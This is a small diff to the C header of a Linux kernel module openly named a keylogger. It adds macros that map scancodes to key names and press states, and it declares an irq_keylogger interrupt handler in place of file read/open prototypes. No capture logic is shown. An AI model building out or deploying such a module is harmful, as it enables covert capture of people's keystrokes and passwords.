@@ -8,9 +8,13 @@
 #include <linux/slab.h>
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
+#include <asm/uaccess.h>
 #include <linux/time.h>
 #include <linux/seq_file.h>
 
+#define IS_PRESSED(x) (x ? "RELEASED" : "PRESSED")
+#define IS_VALID(x) (x < keytable_len ? keytable[x].name : "!UNKNOWN!")
+#define IS_PRINT_CMD(x) (x == 0x1C || x == 0x0F || x == 0x39)
 
 struct stroke_s {
 	unsigned char key;
@@ -32,7 +36,6 @@ extern int keytable_len;
 
 #define COUNT_OF(array) (sizeof(array) / sizeof(*array))
 
-int my_open(struct inode *toto, struct file *tata);
-ssize_t my_read(struct file *f, char __user *buf, size_t size, loff_t *p);
+void irq_keylogger(unsigned long data);
 
 #endif
